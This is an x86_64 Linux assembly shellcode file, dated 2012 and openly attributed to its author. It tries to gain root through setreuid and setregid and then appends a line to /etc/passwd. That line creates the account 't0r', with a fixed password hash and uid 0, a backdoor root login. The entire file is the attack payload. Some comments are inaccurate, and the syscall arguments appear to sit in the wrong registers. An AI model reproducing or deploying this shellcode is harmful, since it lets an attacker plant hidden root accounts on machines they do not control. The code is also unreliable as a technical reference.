;sc_adduser01.S
;Arch:          x86_64, Linux
;Author:        0_o -- null_null
;           nu11.nu11 [at] yahoo.com
;Date:          2012-03-05
;Purpose:       adds user "t0r" with password "Winner" to /etc/passwd
;executed syscalls:     setreuid, setregid, open, write, close, exit
;Result:        t0r:3UgT5tXKUkUFg:0:0::/root:/bin/bash
;syscall op codes:  /usr/include/x86_64-linux-gnu/asm/unistd_64.h
BITS 64
[SECTION .text]
global _start
_start:
;sys_setreuid(uint ruid, uint euid)
xor rax, rax
mov al, 113   ;syscall sys_setreuid
xor rbx, rbx  ;arg 1 -- set real uid to root
mov rcx, rbx  ;arg 2 -- set effective uid to root
syscall
;sys_setregid(uint rgid, uint egid)
xor rax, rax
mov al, 114   ;syscall sys_setregid
xor rbx, rbx  ;arg 1 -- set real uid to root
mov rcx, rbx  ;arg 2 -- set effective uid to root
syscall
;push all strings on the stack prior to file operations.
xor rbx, rbx
mov ebx, 0x647773FF
shr rbx, 8
push rbx                     ; \00dws
mov rbx, 0x7361702f6374652f
push rbx                     ; sap/cte/
mov rbx, 0x0A687361622F6EFF
shr rbx, 8
push rbx                     ; \00\nhsab/n
mov rbx, 0x69622F3A746F6F72
push rbx                     ; ib/:toor
mov rbx, 0x2F3A3A303A303A67
push rbx                     ; /::0:0:g
mov rbx, 0x46556B554B587435
push rbx                     ; FUkUKXt5
mov rbx, 0x546755333A723074
push rbx                     ; TgU3:r0t
;prelude to doing anything useful...
mov rbx, rsp      ;save stack pointer for later use
push rbp          ; base pointer to stack so it can be restored later
mov rbp, rsp      ;set base pointer to current stack pointer
;sys_open(char* fname, int flags, int mode)
sub rsp, 16
mov [rbp - 16], rbx ;store pointer to "t0r..../bash"
mov si, 0x0401    ;arg 2 -- flags
mov rdi, rbx
add rdi, 40       ;arg 1 -- pointer to "/etc/passwd"
xor rax, rax
mov al, 2       ;syscall sys_open
syscall
;sys_write(uint fd, char* buf, uint size)
mov [rbp - 4],  eax     ;arg 1 -- fd is retval of sys_open. save fd to stack for later use.
mov rcx, rbx     ;arg 2 -- load rcx with pointer to string "t0r.../bash"
xor rdx, rdx
mov dl, 39      ;arg 3 -- load rdx with size of string "t0r.../bash\00"
mov rsi, rcx     ;arg 2 -- move to source index register
mov rdi, rax     ;arg 1 -- move to destination index register
xor rax, rax
mov al, 1               ;syscall sys_write
syscall
;sys_close(uint fd)
xor rdi, rdi
mov edi, [rbp - 4]   ;arg 1 -- load stored file descriptor to destination index register
xor rax, rax
mov al, 3       ;syscall sys_close
syscall
;sys_exit(int err_code)
xor rax, rax
mov al, 60          ;syscall sys_exit
xor rbx, rbx         ;arg 1 -- error code
syscall

